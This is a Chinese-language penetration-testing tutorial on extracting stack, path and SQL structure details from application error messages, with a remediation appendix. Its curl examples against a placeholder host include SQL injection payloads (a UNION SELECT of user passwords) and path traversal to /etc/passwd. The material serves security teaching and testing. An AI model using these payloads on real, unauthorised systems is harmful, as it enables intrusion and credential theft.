# 错误信息分析方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对应用程序错误信息分析的方法论，从错误消息中提取有价值的攻击信息。

### 1.2 适用范围
- Web 应用错误处理
- API 错误响应
- 数据库错误信息
- 系统错误消息

### 1.3 读者对象
- 渗透测试工程师
- 应用安全测试人员

---

## 第二部分：核心分析技术专题

### 专题：错误信息分析

#### 2.1 技术介绍

错误信息分析是指从应用程序返回的错误消息中提取敏感信息，用于辅助攻击的技术。

**可提取的信息类型：**
- 技术栈信息（框架、版本）
- 数据库结构（表名、字段名）
- 文件路径（绝对路径）
- 查询语句（SQL 结构）
- 内部 IP 地址

#### 2.2 错误信息分类

| 错误类型 | 示例 | 利用价值 |
|---------|------|---------|
| **SQL 错误** | `ORA-00933: SQL command not properly ended` | SQL 注入辅助 |
| **堆栈跟踪** | `at com.app.Service.method(Service.java:42)` | 代码逻辑分析 |
| **路径泄露** | `FileNotFoundError: /var/www/app/config.py` | 路径遍历 |
| **版本信息** | `Python 3.9.7 / Django 3.2.5` | 已知漏洞利用 |
| **连接字符串** | `mysql://user:pass@localhost:3306/db` | 直接访问 |

#### 2.3 分析方法

##### 2.3.1 错误触发

```bash
# 1. 输入特殊字符
curl "http://target/search?q=' OR '1'='1"
curl "http://target/user?id=1'"

# 2. 触发异常
curl "http://target/file?path=../../etc/passwd"
curl "http://target/api/data?format=invalid"

# 3. 边界测试
curl "http://target/user?id=-1"
curl "http://target/user?id=999999999999"
```

##### 2.3.2 信息提取

```bash
# 1. SQL 错误分析
# 错误：You have an error in your SQL syntax; ... near ''1'' at line 1
# 推断：SELECT * FROM users WHERE id='$input'

# 2. 路径分析
# 错误：FileNotFoundError: /var/www/app/files/../../etc/passwd
# 推断：Web 根目录 /var/www/app/files/

# 3. 技术栈分析
# 错误：at org.springframework.web.servlet.FrameworkServlet.service
# 推断：Spring Framework 应用
```

#### 2.4 利用方法

##### 2.4.1 SQL 注入辅助

```bash
# 1. 触发 SQL 错误
curl "http://target/product?id=1'"

# 2. 分析错误信息
# You have an error in your SQL syntax; ... near ''1'' at line 1

# 3. 推断查询结构
# SELECT * FROM products WHERE id='$input'

# 4. 构造注入 Payload
curl "http://target/product?id=1' UNION SELECT password FROM users--"
```

##### 2.4.2 路径遍历

```bash
# 1. 触发路径错误
curl "http://target/file?name=../../etc/passwd"

# 2. 分析错误信息
# FileNotFoundError: /var/www/app/files/../../etc/passwd

# 3. 确定基础路径
# /var/www/app/files/

# 4. 构造精确 Payload
curl "http://target/file?name=../../../etc/passwd"
```

---

## 第三部分：附录

### 3.1 修复建议

1. **统一错误处理** - 使用全局异常处理机制
2. **返回通用消息** - 不向用户暴露详细错误
3. **记录详细日志** - 仅供内部调试使用
4. **关闭调试模式** - 生产环境 DEBUG=False

### 3.2 参考资源

- [OWASP Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)
